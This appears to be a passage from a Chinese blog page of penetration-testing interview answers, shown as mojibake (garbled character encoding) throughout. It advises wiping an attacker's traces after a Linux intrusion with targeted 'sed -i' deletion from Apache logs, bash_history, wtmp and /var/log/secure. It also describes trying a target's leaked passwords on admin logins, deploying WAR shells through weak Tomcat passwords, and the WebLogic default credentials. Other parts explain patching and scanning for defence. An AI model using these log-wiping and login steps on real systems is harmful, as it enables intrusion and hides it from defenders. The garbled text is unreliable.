id="å…¥ä¾µ-Linux-åéœ€è¦æ¸…é™¤å“ªäº›æ—¥å¿—"><a href="#å…¥ä¾µ-Linux-åéœ€è¦æ¸…é™¤å“ªäº›æ—¥å¿—" class="headerlink" title="å…¥ä¾µ Linux åéœ€è¦æ¸…é™¤å“ªäº›æ—¥å¿—"></a>å…¥ä¾µ Linux åéœ€è¦æ¸…é™¤å“ªäº›æ—¥å¿—</h2><p>1ï¼‰web æ—¥å¿—å¦‚ apache çš„ access.log,error.logã€‚ç›´æ¥å°†æ—¥å¿—æ¸…é™¤è¿‡äºæ˜æ˜¾ï¼Œä¸€èˆ¬ä½¿ç”¨ sed è¿›è¡Œå®šå‘æ¸…é™¤ï¼šsed -i -e â€˜&#x2F;192.169.1.1&#x2F;dâ€™<br>2ï¼‰history å‘½ä»¤çš„æ¸…é™¤ï¼Œä¹Ÿæ˜¯å¯¹ ~&#x2F;.bash_history è¿›è¡Œå®šå‘æ¸…é™¤<br>3ï¼‰wtmp æ—¥å¿—çš„æ¸…é™¤ï¼Œ&#x2F;var&#x2F;log&#x2F;wtmp<br>4ï¼‰ç™»å½•æ—¥å¿—æ¸…é™¤ &#x2F;var&#x2F;log&#x2F;secure</p><h2 id="åŸŸå†…æ¨ªå‘ç§»åŠ¨"><a href="#åŸŸå†…æ¨ªå‘ç§»åŠ¨" class="headerlink" title="åŸŸå†…æ¨ªå‘ç§»åŠ¨"></a>åŸŸå†…æ¨ªå‘ç§»åŠ¨</h2><p>åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œå½“æ”»å‡»è€…è·å–åˆ°å†…ç½‘æŸå°æœºå™¨çš„æ§åˆ¶æƒåï¼Œä¼šä»¥è¢«æ”»é™·çš„ä¸»æœºä¸ºè·³æ¿ï¼Œé€šè¿‡æ”¶é›†åŸŸå†…å‡­è¯ç­‰å„ç§æ–¹æ³•ï¼Œè®¿é—®åŸŸå†…å…¶ä»–æœºå™¨ï¼Œè¿›ä¸€æ­¥æ‰©å¤§èµ„äº§èŒƒå›´ã€‚é€šè¿‡æ­¤ç±»æ‰‹æ®µï¼Œæ”»å‡»è€…æœ€ç»ˆå¯èƒ½è·å¾—åŸŸæ§åˆ¶å™¨çš„è®¿é—®æƒé™ï¼Œç”šè‡³å®Œå…¨æ§åˆ¶åŸºäºWindows æ“ä½œç³»ç»Ÿçš„æ•´ä¸ªå†…ç½‘ç¯å¢ƒï¼Œæ§åˆ¶åŸŸç¯å¢ƒä¸‹çš„å…¨éƒ¨æœºå™¨ã€‚</p><h2 id="Windowsã€linux-åå¼¹-shell-çš„æ–¹å¼"><a href="#Windowsã€linux-åå¼¹-shell-çš„æ–¹å¼" class="headerlink" title="Windowsã€linux åå¼¹ shell çš„æ–¹å¼"></a>Windowsã€linux åå¼¹ shell çš„æ–¹å¼</h2><p>Windows: powershell åå¼¹ shellã€powercat åå¼¹ shell<br>Linux: bash åå¼¹ shellã€netcat åå¼¹ shellã€wget åå¼¹ shellã€python åå¼¹ shellã€php åå¼¹ shell</p><h2 id="å­åŸŸåæœé›†çš„æ–¹å¼"><a href="#å­åŸŸåæœé›†çš„æ–¹å¼" class="headerlink" title="å­åŸŸåæœé›†çš„æ–¹å¼"></a>å­åŸŸåæœé›†çš„æ–¹å¼</h2><p>å¯ä»¥ä» js æ–‡ä»¶ä¸­å¯»æ‰¾ã€æœç´¢å¼•æ“ï¼ˆè°·æ­Œè¯­æ³•ã€fofaï¼‰ã€è¯ä¹¦æŸ¥è¯¢ã€ä½¿ç”¨ crossdomain.xml æ–‡ä»¶ã€dns è®°å½•ã€æšä¸¾ã€åŸŸä¼ é€æ¼æ´ã€‚</p><h2 id="Oneforall-æœç´¢çš„åŸç†"><a href="#Oneforall-æœç´¢çš„åŸç†" class="headerlink" title="Oneforall æœç´¢çš„åŸç†"></a>Oneforall æœç´¢çš„åŸç†</h2><p>åˆ©ç”¨è¯ä¹¦é€æ˜åº¦ã€ç½‘ä¸Šçˆ¬è™«æ¡£æ¡ˆã€DNS æ•°æ®é›†ã€DNS æŸ¥è¯¢ã€å¨èƒæƒ…æŠ¥å¹³å°æ•°æ®ã€æœç´¢å¼•æ“ã€å¸¸è§„æ£€æŸ¥æ¥è¿›è¡Œå­åŸŸåæœé›†çš„ã€‚</p><h2 id="æ‹¿åˆ°ä¸€ä¸ªå¾…æ£€æµ‹çš„ç«™ï¼Œä½ è§‰å¾—åº”è¯¥å…ˆåšä»€ä¹ˆ"><a href="#æ‹¿åˆ°ä¸€ä¸ªå¾…æ£€æµ‹çš„ç«™ï¼Œä½ è§‰å¾—åº”è¯¥å…ˆåšä»€ä¹ˆ" class="headerlink" title="æ‹¿åˆ°ä¸€ä¸ªå¾…æ£€æµ‹çš„ç«™ï¼Œä½ è§‰å¾—åº”è¯¥å…ˆåšä»€ä¹ˆ"></a>æ‹¿åˆ°ä¸€ä¸ªå¾…æ£€æµ‹çš„ç«™ï¼Œä½ è§‰å¾—åº”è¯¥å…ˆåšä»€ä¹ˆ</h2><p>1ï¼‰è·å–åŸŸåçš„ whois ä¿¡æ¯ï¼Œè·å–æ³¨å†Œè€…é‚®ç®±å§“åç”µè¯ç­‰ï¼Œä¸¢ç¤¾å·¥åº“é‡Œçœ‹çœ‹æœ‰æ²¡æœ‰æ³„éœ²å¯†ç ï¼Œç„¶åå°è¯•ç”¨æ³„éœ²çš„å¯†ç è¿›è¡Œç™»å½•åå°ã€‚ç”¨é‚®ç®±åšå…³é”®è¯è¿›è¡Œä¸¢è¿›æœç´¢å¼•æ“ã€‚åˆ©ç”¨æœç´¢åˆ°çš„å…³è”ä¿¡æ¯æ‰¾å‡ºå…¶ä»–é‚®ç®±è¿›è€Œå¾—åˆ°å¸¸ç”¨ç¤¾äº¤è´¦å·ã€‚ç¤¾å·¥æ‰¾å‡ºç¤¾äº¤è´¦å·ï¼Œé‡Œé¢æˆ–è®¸ä¼šæ‰¾å‡ºç®¡ç†å‘˜è®¾ç½®å¯†ç çš„ä¹ æƒ¯ã€‚åˆ©ç”¨å·²æœ‰ä¿¡æ¯ç”Ÿæˆä¸“ç”¨å­—å…¸ã€‚<br>2ï¼‰æŸ¥è¯¢æœåŠ¡å™¨æ—ç«™ä»¥åŠå­åŸŸåç«™ç‚¹ï¼Œå› ä¸ºä¸»ç«™ä¸€èˆ¬æ¯”è¾ƒéš¾ï¼Œæ‰€ä»¥å…ˆçœ‹çœ‹æ—ç«™æœ‰æ²¡æœ‰é€šç”¨æ€§çš„ cms æˆ–è€…å…¶ä»–æ¼æ´ã€‚<br>3ï¼‰æŸ¥çœ‹æœåŠ¡å™¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œweb ä¸­é—´ä»¶ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨å·²çŸ¥çš„æ¼æ´ï¼Œæ¯”å¦‚ IISï¼ŒAPACHE,NGINX çš„è§£ææ¼æ´ã€‚<br>4ï¼‰æŸ¥çœ‹ IPï¼Œè¿›è¡Œ IP åœ°å€ç«¯å£æ‰«æï¼Œå¯¹å“åº”çš„ç«¯å£è¿›è¡Œæ¼æ´æ¢æµ‹ï¼Œæ¯”å¦‚ rsyncï¼Œå¿ƒè„æ»´è¡€ï¼Œmysql,ftp,ssh å¼±å£ä»¤ç­‰ã€‚<br>5ï¼‰æ‰«æç½‘ç«™ç›®å½•ç»“æ„ï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥éå†ç›®å½•ï¼Œæˆ–è€…æ•æ„Ÿæ–‡ä»¶æ³„æ¼ï¼Œæ¯”å¦‚ php æ¢é’ˆã€‚<br>6ï¼‰google hack è¿›ä¸€æ­¥æ¢æµ‹ç½‘ç«™çš„ä¿¡æ¯ï¼Œåå°ï¼Œæ•æ„Ÿæ–‡ä»¶ã€‚</p><p>å‰©ä¸‹å°±æ˜¯ä¸Šé¢çš„æµ‹è¯•æµç¨‹äº†</p><h2 id="æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„ç«¯å£"><a href="#æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„ç«¯å£" class="headerlink" title="æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„ç«¯å£"></a>æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„ç«¯å£</h2><p>1ï¼‰web ç±»ï¼ˆweb æ¼æ´&#x2F;æ•æ„Ÿç›®å½•ï¼‰ç¬¬ä¸‰æ–¹é€šç”¨ç»„ä»¶æ¼æ´ struts thinkphp jboss ganglia Zabbixï¼š80 webã€80-89 webã€8000-9090 web<br>2ï¼‰æ•°æ®åº“ç±»ï¼ˆæ‰«æå¼±å£ä»¤ï¼‰ï¼š1433 MSSQLã€1521 Oracleã€3306 MySQLã€5432 PostgreSQL<br>3ï¼‰ç‰¹æ®ŠæœåŠ¡ç±»ï¼ˆæœªæˆæƒ&#x2F;å‘½ä»¤æ‰§è¡Œç±»&#x2F;æ¼æ´ï¼‰ï¼š443 SSL å¿ƒè„æ»´è¡€ã€873 Rsync æœªæˆæƒã€5984 CouchDB <a href="http://xxx:5984/_utils/%E3%80%816379">http://xxx:5984/_utils/ã€6379</a> redis æœªæˆæƒã€7001,7002 WebLogic é»˜è®¤å¼±å£ä»¤ï¼Œååºåˆ—ã€9200,9300 elasticsearch å‚è€ƒ WooYunï¼šå¤šç©æŸæœåŠ¡å™¨ ElasticSearch å‘½ä»¤æ‰§è¡Œæ¼æ´ã€11211 memcache æœªæˆæƒè®¿é—®ã€27017,27018 Mongodb æœªæˆæƒè®¿é—®ã€50000 SAP å‘½ä»¤æ‰§è¡Œã€50070,50030 hadoop é»˜è®¤ç«¯å£æœªæˆæƒè®¿é—®<br>4ï¼‰å¸¸ç”¨ç«¯å£ç±»ï¼ˆæ‰«æå¼±å£ä»¤&#x2F;ç«¯å£çˆ†ç ´ï¼‰ï¼š21 ftpã€22 SSHã€23 Telnetã€2601,2604 zebra è·¯ç”±ï¼Œé»˜è®¤å¯†ç  zebraã€3389 è¿œç¨‹æ¡Œé¢</p><h2 id="12ã€ç®€è¿°-nmap-å‚æ•°å’Œä¸åŒæ–¹æ³•æ‰«æçš„ä¼˜ç¼ºç‚¹"><a href="#12ã€ç®€è¿°-nmap-å‚æ•°å’Œä¸åŒæ–¹æ³•æ‰«æçš„ä¼˜ç¼ºç‚¹" class="headerlink" title="12ã€ç®€è¿° nmap å‚æ•°å’Œä¸åŒæ–¹æ³•æ‰«æçš„ä¼˜ç¼ºç‚¹"></a>12ã€ç®€è¿° nmap å‚æ•°å’Œä¸åŒæ–¹æ³•æ‰«æçš„ä¼˜ç¼ºç‚¹</h2><p>-STâ€”TCP(å…¨)è¿æ¥æ‰«æï¼Œå‡†ç¡®ä½†ç•™ä¸‹å¤§é‡æ—¥å¿—è®°å½•<br>-SSâ€”TCP SYN(åŠ)æ‰«æï¼Œé€Ÿåº¦è¾ƒå¿«ï¼Œä¸ä¼šç•™ä¸‹æ—¥å¿—<br>-sNâ€”null æ‰«æï¼Œæ ‡å¿—ä½å…¨ä¸º 0ï¼Œä¸é€‚ç”¨ Windows<br>-sFâ€”FIN æ‰«æï¼Œæ ‡å¿—ä½ FIN&#x3D;1ï¼Œä¸é€‚ç”¨ Windows<br>-Oâ€”æŸ¥çœ‹ç›®æ ‡ä¸»æœºç‰ˆæœ¬<br>-sVâ€”æ¢æµ‹æœåŠ¡ç‰ˆæœ¬<br>-Aâ€”å…¨é¢æ‰«æ</p><h2 id="ç®€è¿°-Windows-åŠ-linux-å¹³å°ææƒæ–¹æ³•"><a href="#ç®€è¿°-Windows-åŠ-linux-å¹³å°ææƒæ–¹æ³•" class="headerlink" title="ç®€è¿° Windows åŠ linux å¹³å°ææƒæ–¹æ³•"></a>ç®€è¿° Windows åŠ linux å¹³å°ææƒæ–¹æ³•</h2><p>Windows æ ¹æ®ç³»ç»Ÿä¸­æ²¡æœ‰æ‰“çš„è¡¥ä¸ç¼–å·ç›´æ¥æ‰¾ exp ææƒï¼›<br>linux é€šè¿‡ç³»ç»Ÿå†…æ ¸ææƒï¼Œuname -r æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬ï¼ŒæŸ¥æ‰¾æ¼æ´ä¸‹è½½ exp ææƒã€‚</p><h2 id="ç®€è¿°-linux-ç³»ç»Ÿä¸­æŸ¥è¯¢æ—¥å¿—æ–¹æ³•"><a href="#ç®€è¿°-linux-ç³»ç»Ÿä¸­æŸ¥è¯¢æ—¥å¿—æ–¹æ³•" class="headerlink" title="ç®€è¿° linux ç³»ç»Ÿä¸­æŸ¥è¯¢æ—¥å¿—æ–¹æ³•"></a>ç®€è¿° linux ç³»ç»Ÿä¸­æŸ¥è¯¢æ—¥å¿—æ–¹æ³•</h2><p>ç™»å½•æ—¥å¿— lastï¼›<br>æ“ä½œæ—¥å¿— historyï¼›<br>å¯åŠ¨ä¿¡æ¯å’Œé”™è¯¯æ—¥å¿—&#x2F;var&#x2F;log&#x2F;messageï¼›<br>å®‰å…¨æ—¥å¿—&#x2F;var&#x2F;log&#x2F;secureï¼›<br>é‚®ä»¶æ—¥å¿—&#x2F;var&#x2F;log&#x2F;maillogï¼›<br>è®¡åˆ’ä»»åŠ¡æ—¥å¿—&#x2F;var&#x2F;log&#x2F;cronï¼›</p><h2 id="æè¿°ä¸€ä¸‹-DeDecms-ä»»æ„å¯†ç é‡ç½®æ¼æ´"><a href="#æè¿°ä¸€ä¸‹-DeDecms-ä»»æ„å¯†ç é‡ç½®æ¼æ´" class="headerlink" title="æè¿°ä¸€ä¸‹ DeDecms ä»»æ„å¯†ç é‡ç½®æ¼æ´"></a>æè¿°ä¸€ä¸‹ DeDecms ä»»æ„å¯†ç é‡ç½®æ¼æ´</h2><p>DeDecms æ˜¯ç”¨æˆ·ä½¿ç”¨æœ€å¤šçš„ PHP ç±» cms ç³»ç»Ÿã€‚DeDecms çš„ä»»æ„å¯†ç é‡ç½®æ¼æ´é€šè¿‡éå† UID çš„æ–¹å¼è·å–è¿”å›çš„é™æ€ gourl è·³è½¬åœ°å€ï¼Œè€Œ CMS æœªå¯¹æ›´æ”¹å¯†ç çš„è·³è½¬åœ°å€è¿›è¡Œå‚æ•°éšè—å¯¼è‡´æ›´æ”¹å¯†ç çš„ä¸´æ—¶å¯†ç è¢«æ³„éœ²ï¼Œæ³„éœ²ä»¥åæ„é€  URL ä¼ å…¥ä¸´æ—¶å¯†ç ï¼Œå¯ä»¥ä¸éœ€è¦ä»»ä½•éªŒè¯å³å¯æ›´æ”¹ä»»æ„ç”¨æˆ·å¯†ç ã€‚</p><h2 id="å¸¸è§çš„ç½‘ç«™æœåŠ¡å™¨å®¹å™¨"><a href="#å¸¸è§çš„ç½‘ç«™æœåŠ¡å™¨å®¹å™¨" class="headerlink" title="å¸¸è§çš„ç½‘ç«™æœåŠ¡å™¨å®¹å™¨"></a>å¸¸è§çš„ç½‘ç«™æœåŠ¡å™¨å®¹å™¨</h2><p>IISã€Apacheã€nginxã€Lighttpdã€Tomcat</p><h2 id="å¦‚ä½•æ£€æµ‹-iis-çŸ­æ–‡ä»¶åæ¼æ´"><a href="#å¦‚ä½•æ£€æµ‹-iis-çŸ­æ–‡ä»¶åæ¼æ´" class="headerlink" title="å¦‚ä½•æ£€æµ‹ iis çŸ­æ–‡ä»¶åæ¼æ´"></a>å¦‚ä½•æ£€æµ‹ iis çŸ­æ–‡ä»¶åæ¼æ´</h2><p>æ–¹æ³•ä¸€ï¼šä½¿ç”¨ iis_shortname_Scan.py è„šæœ¬è¿›è¡Œæ£€æµ‹<br>ç”¨æ³•ï¼špython IIS_shortname_Scan.py <a href="http://www.target.com/">http://www.target.com/</a><br>æ–¹æ³•äºŒï¼šä½¿ç”¨ nmapï¼Œå‘½ä»¤ä¸º nmap -p 80 â€“script http-iis-short-name-brute 192.168.0.1&#x2F;24</p><p>IISçŸ­æ–‡ä»¶åæ¼æ´æ˜¯ç”±äºHTTPè¯·æ±‚ä¸­æ—§DOS 8.3åç§°çº¦å®šï¼ˆSFNï¼‰çš„ä»£å­—ç¬¦ï¼ˆ~ï¼‰æ³¢æµªå·å¼•èµ·çš„ï¼Œå®ƒå…è®¸è¿œç¨‹æ”»å‡»è€…åœ¨Webæ ¹ç›®å½•ä¸‹å…¬å¼€æ–‡ä»¶å’Œæ–‡ä»¶å¤¹åç§°(ä¸åº”è¯¥å¯è¢«è®¿é—®)ã€‚æ”»å‡»è€…å¯ä»¥æ‰¾åˆ°é€šå¸¸æ— æ³•ä»å¤–éƒ¨ç›´æ¥è®¿é—®çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è·å–æœ‰å…³åº”ç”¨ç¨‹åºåŸºç¡€ç»“æ„çš„ä¿¡æ¯ã€‚<br>æ£€æµ‹åŸç†åŸºäºIISçš„çŸ­æ–‡ä»¶åæœºåˆ¶ï¼Œå¯ä»¥æš´åŠ›çŒœè§£çŸ­æ–‡ä»¶åï¼Œè®¿é—®æ„é€ çš„æŸä¸ªå­˜åœ¨çš„çŸ­æ–‡ä»¶åï¼Œä¼šè¿”å›404ï¼Œè®¿é—®æ„é€ çš„æŸä¸ªä¸å­˜åœ¨çš„çŸ­æ–‡ä»¶åï¼Œè¿”å›400ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•æšä¸¾å‡ºæœåŠ¡å™¨ä¸­å­˜åœ¨çš„çŸ­æ–‡ä»¶åï¼Œå†æ ¹æ®çŸ­æ–‡ä»¶åçŒœæµ‹å‡ºæœ€ç»ˆçš„æ–‡ä»¶åç§°ä¿¡æ¯ã€‚è¯¥å·¥å…·é€šè¿‡å°è¯•è®¿é—®ä¸åŒç»„åˆçš„çŸ­æ–‡ä»¶åæ¥æ£€æµ‹IISæœåŠ¡å™¨æ˜¯å¦å®¹æ˜“å—åˆ°çŸ­æ–‡ä»¶åæ¼æ´çš„å½±å“ã€‚</p><h2 id="å¦‚ä½•åˆ¤åˆ«-web-æœåŠ¡å™¨æ˜¯-windows-è¿˜æ˜¯-linux"><a href="#å¦‚ä½•åˆ¤åˆ«-web-æœåŠ¡å™¨æ˜¯-windows-è¿˜æ˜¯-linux" class="headerlink" title="å¦‚ä½•åˆ¤åˆ« web æœåŠ¡å™¨æ˜¯ windows è¿˜æ˜¯ linux"></a>å¦‚ä½•åˆ¤åˆ« web æœåŠ¡å™¨æ˜¯ windows è¿˜æ˜¯ linux</h2><p>æ–¹æ³•ä¸€ï¼šnmap å¸¦ä¸Š -O å‚æ•°<br>æ–¹æ³•äºŒï¼šæŸ¥çœ‹ http æŠ¥å¤´ Server å­—æ®µ<br>æ–¹æ³•ä¸‰ï¼šWindows å¯¹äºå¤§å°å†™ä¸æ•æ„Ÿï¼Œæ›¿æ¢æŸä¸ªå­—æ¯ä¸ºå¤§å†™è¿”å›æ­£å¸¸ä¸º Windowsï¼Œåä¹‹ Linux<br>æ–¹æ³•å››ï¼šTTL è¿”å›å€¼ï¼ŒTTL ä¸º 64ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ€§ä¸º Linuxï¼ŒTTL ä¸º 128ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ€§ä¸º Windowsï¼ŒTTL ä¸º 255ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ€§ä¸º UNIXï¼ˆå¯ä¿®æ”¹ TTLï¼‰<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.zhihu.com/question/20375910">https://www.zhihu.com/question/20375910</a></p><h2 id="Tomcat-æ¼æ´åˆ©ç”¨"><a href="#Tomcat-æ¼æ´åˆ©ç”¨" class="headerlink" title="Tomcat æ¼æ´åˆ©ç”¨"></a>Tomcat æ¼æ´åˆ©ç”¨</h2><p>å¼±å£ä»¤è¿›å…¥åå°éƒ¨ç½² war åŒ… getshellã€put æ–¹æ³•ä»»æ„æ–‡ä»¶ä¸Šä¼  (CVE-2017-12615)ã€tomcat ajp åè®®æ–‡ä»¶åŒ…å«æ¼æ´</p><h2 id="Weblogic-åå°é»˜è®¤å¯†ç "><a href="#Weblogic-åå°é»˜è®¤å¯†ç " class="headerlink" title="Weblogic åå°é»˜è®¤å¯†ç "></a>Weblogic åå°é»˜è®¤å¯†ç </h2><p>WebLogicæ˜¯ç¾å›½Oracleå…¬å¸å‡ºå“çš„ä¸€ä¸ªapplication serverï¼Œç¡®åˆ‡çš„è¯´æ˜¯ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„ä¸­é—´ä»¶ã€‚WebLogicæ˜¯ç”¨äºå¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†å¤§å‹åˆ†å¸ƒå¼Webåº”ç”¨ã€ç½‘ç»œåº”ç”¨å’Œæ•°æ®åº“åº”ç”¨çš„Javaåº”ç”¨æœåŠ¡å™¨ã€‚å®ƒå°†Javaçš„åŠ¨æ€åŠŸèƒ½å’ŒJava Enterpriseæ ‡å‡†çš„å®‰å…¨æ€§å¼•å…¥å¤§å‹ç½‘ç»œåº”ç”¨çš„å¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†ä¹‹ä¸­ã€‚WebLogic Serverä»¥å…¶é«˜æ‰©å±•çš„æ¶æ„ä½“ç³»é—»åäºä¸šå†…ï¼ŒåŒ…æ‹¬å®¢æˆ·æœºè¿æ¥çš„å…±äº«ã€èµ„æºpoolingä»¥åŠåŠ¨æ€ç½‘é¡µå’ŒEJBç»„ä»¶ç¾¤é›†ã€‚å®ƒæ”¯æŒå®Œæ•´çš„Java EEè§„èŒƒï¼ŒåŒ…æ‹¬JSPã€Servletã€EJBï¼ˆEnterprise JavaBeansï¼‰ã€JMSï¼ˆJava Message Serviceï¼‰ã€JNDIï¼ˆJava Naming and Directory Interfaceï¼‰ã€JTAï¼ˆJava Transaction APIï¼‰ç­‰ï¼Œé€‚ç”¨äºå¤§è§„æ¨¡åˆ†å¸ƒå¼åº”ç”¨ã€‚<br>weblogic&#x2F;weblogic</p><h2 id="Weblogic-çš„-CVE-2019-2725-æ¼æ´æè¿°ä¸ä¿®å¤æ–¹æ¡ˆ"><a href="#Weblogic-çš„-CVE-2019-2725-æ¼æ´æè¿°ä¸ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="Weblogic çš„ CVE-2019-2725 æ¼æ´æè¿°ä¸ä¿®å¤æ–¹æ¡ˆ"></a>Weblogic çš„ CVE-2019-2725 æ¼æ´æè¿°ä¸ä¿®å¤æ–¹æ¡ˆ</h2><p>æ¼æ´æè¿°ï¼šç”±äºåœ¨ååºåˆ—åŒ–å¤„ç†è¾“å…¥ä¿¡æ¯çš„è¿‡ç¨‹ä¸­å­˜åœ¨ç¼ºé™·ï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…å¯ä»¥å‘é€ç²¾å¿ƒæ„é€ çš„æ¶æ„ HTTP è¯·æ±‚ï¼Œåˆ©ç”¨è¯¥æ¼æ´è·å–æœåŠ¡å™¨æƒé™ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><p>ä¿®å¤å»ºè®®ï¼šå®˜æ–¹ç›®å‰å·²å‘å¸ƒé’ˆå¯¹æ­¤æ¼æ´çš„ç´§æ€¥ä¿®å¤è¡¥ä¸ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹ 4 ç§æ–¹å¼è¿›è¡Œé˜²æŠ¤ã€‚<br>1ï¼‰åŠæ—¶æ‰“ä¸Šå®˜æ–¹ CVE-2019-2725 è¡¥ä¸åŒ…<br>å®˜æ–¹å·²äº 4 æœˆ 26 æ—¥å…¬å¸ƒç´§æ€¥è¡¥ä¸åŒ…ï¼Œä¸‹è½½åœ°å€ï¼š<br><a href="https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-546295.html?from=timeline">https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-546295.html?from=timeline</a></p><p>2ï¼‰å‡çº§SDKç‰ˆæœ¬</p><p>3ï¼‰é…ç½® URL è®¿é—®æ§åˆ¶ç­–ç•¥<br>éƒ¨ç½²äºå…¬ç½‘çš„ WebLogic æœåŠ¡å™¨ï¼Œå¯é€šè¿‡ ACL ç¦æ­¢å¯¹ &#x2F;_async&#x2F; åŠ &#x2F;wls-wsat&#x2F; è·¯å¾„çš„è®¿é—®ã€‚</p><p>4ï¼‰åˆ é™¤ä¸å®‰å…¨æ–‡ä»¶<br>åˆ é™¤ wls9_async_response.war ä¸ wls-wsat.war æ–‡ä»¶åŠç›¸å…³æ–‡ä»¶å¤¹ï¼Œå¹¶é‡å¯ Weblogic æœåŠ¡ã€‚å…·ä½“æ–‡ä»¶è·¯å¾„å¦‚ä¸‹ï¼š<br>10.3.x ç‰ˆæœ¬ï¼š<br>\MiddleWare\server_10.3\server\lib%DOMAIN_HOME%\servers\AdminServer\tmp_WL_internal<br>%DOMAIN_HOME%\servers\AdminServer\tmp.internal\</p><p>12.1.3 ç‰ˆæœ¬ï¼š<br>\MiddleWare\Oracle_Home\oracle_common\modules%DOMAIN_HOME%\servers\AdminServer\tmp.internal%DOMAIN_HOME%\servers\AdminServer\tmp_WL_internal<br>æ³¨ï¼‰wls9_async_response.war åŠ wls-wsat.war å±äºä¸€çº§åº”ç”¨åŒ…ï¼Œå¯¹å…¶è¿›è¡Œç§»é™¤æˆ–æ›´åæ“ä½œå¯èƒ½é€ æˆæœªçŸ¥çš„åæœï¼ŒOracle å®˜æ–¹ä¸å»ºè®®å¯¹å…¶è¿›è¡Œæ­¤ç±»æ“ä½œã€‚è‹¥åœ¨ç›´æ¥åˆ é™¤æ­¤åŒ…çš„æƒ…å†µä¸‹åº”ç”¨å‡ºç°é—®é¢˜ï¼Œå°†æ— æ³•å¾—åˆ° Oracle äº§å“éƒ¨é—¨çš„æŠ€æœ¯æ”¯æŒã€‚è¯·ç”¨æˆ·è‡ªè¡Œè¿›è¡Œå½±å“è¯„ä¼°ï¼Œå¹¶å¯¹æ­¤æ–‡ä»¶è¿›è¡Œå¤‡ä»½åï¼Œå†æ‰§è¡Œæ­¤æ“ä½œã€‚</p><h2 id="å‡è®¾ç°-weblogic-çˆ†å‘-0day-æ¼æ´ï¼Œéœ€è¦ä½ ç´§æ€¥æ’æŸ¥å½±å“ï¼Œè¯´è¯´ä½ çš„çœ‹æ³•ï¼Ÿ"><a href="#å‡è®¾ç°-weblogic-çˆ†å‘-0day-æ¼æ´ï¼Œéœ€è¦ä½ ç´§æ€¥æ’æŸ¥å½±å“ï¼Œè¯´è¯´ä½ çš„çœ‹æ³•ï¼Ÿ" class="headerlink" title="å‡è®¾ç° weblogic çˆ†å‘ 0day æ¼æ´ï¼Œéœ€è¦ä½ ç´§æ€¥æ’æŸ¥å½±å“ï¼Œè¯´è¯´ä½ çš„çœ‹æ³•ï¼Ÿ"></a>å‡è®¾ç° weblogic çˆ†å‘ 0day æ¼æ´ï¼Œéœ€è¦ä½ ç´§æ€¥æ’æŸ¥å½±å“ï¼Œè¯´è¯´ä½ çš„çœ‹æ³•ï¼Ÿ</h2><p>é¢˜ç›®æè¿°ï¼šå‡è®¾ç° weblogic çˆ†å‘ 0day æ¼æ´ï¼Œweblogic çš„ &#x2F;vulpath å­˜åœ¨æ¼æ´ï¼Œæ‰€æœ‰å­˜åœ¨ <a href="http://ip:port/vulpath">http://ip:port/vulpath</a> è·¯å¾„çš„ç³»ç»Ÿå‡å—å½±å“ï¼Œç°å·²å®Œæˆç›®æ ‡èµ„äº§çš„ç«¯å£æ‰«æï¼Œéœ€è¦ä½ ç´§æ€¥æ’æŸ¥å—å½±å“èµ„äº§ï¼Œè¯·è¯´è¯´ä½ çš„åšæ³•<br>å‡è®¾ç«¯å£æ‰«ææ—¶å·²æœ‰ç‰ˆæœ¬è¯†åˆ«ï¼ŒæŒ‘å‡ºæ‰€æœ‰ weblogic æœåŠ¡ã€‚å­˜åœ¨ IP+ç«¯å£åœ°å€åï¼Œé€šè¿‡ url æ‰¹é‡æ£€æµ‹è„šæœ¬ httpCatcher.py æ£€æµ‹å‡ºæ˜¯å¦å­˜åœ¨ ip:port&#x2F;vulpath è·¯å¾„ 200 è¿”å›å€¼ï¼Œè¿”å›å³ä¸ºå—å½±å“èµ„äº§ã€‚<br>ç”¨æ³•ä¸ºï¼šå°† IP+ç«¯å£å­˜åœ¨ä¸€ä¸ª ip.txt æ–‡ä»¶</p><p>152.136.121.47:808<br>39.108.141.35:443<br>39.108.141.35:80</p><p>ç„¶åä¿®æ”¹ httpCatcher.py çš„è·¯å¾„æ”¹ä¸º &#x2F;vulpath</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">outfile = sys.argv[<span class="number">2</span>]</span><br><span class="line">path = <span class="string">&#x27;/&#x27;</span>  <span class="comment">##æ”¹ä¸º &#x27;/vulpath&#x27;</span></span><br><span class="line">addrlist = []</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        addrlist = f.readlines()</span><br></pre></td></tr></table></figure><p>è¾“å…¥å‘½ä»¤ python httpCatcher.py ip.txt 1.csv å³å¯å¾—åˆ° 1.csv æ–‡ä»¶ï¼ŒæŸ¥çœ‹å³å¯</p><h2 id="å¸¸è§ä¸­é—´ä»¶çš„é…ç½®æ–‡ä»¶è·¯å¾„"><a 